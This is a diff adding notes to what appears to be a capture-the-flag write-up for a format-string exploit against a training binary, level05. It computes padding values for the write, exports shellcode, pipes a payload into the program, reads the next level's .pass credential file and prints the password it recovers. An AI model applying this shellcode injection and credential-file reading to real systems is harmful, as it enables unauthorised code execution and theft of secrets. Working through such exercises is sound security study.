@@ -123,3 +123,33 @@ and same element you need to substract already print 65535-55241 = 10294
 
 
 
+
+## Calculation with 0xffffd85a + 30
+
+Final address: 0xffffd85a + 30 (0x1e) = 0xffffd878
+
+Calculate the padding value 0xffffd878:
+
+gef➤  p/d 0xd878
+55416
+
+So the first value is 55416
+with subtraction of 8 because already printed with 2x
+55416 - 8 = 55408 (first value)
+
+Second value (same principle):
+
+gef➤  p/d 0xffff
+$3 = 65535
+
+And subtract what has already been printed: 65535 - 55416 = 10119 (second value)
+
+
+export SHELLCODE=$(cat /tmp/shellcode)
+
+(cat /tmp/payload; cat -) | ./level05 
+
+
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
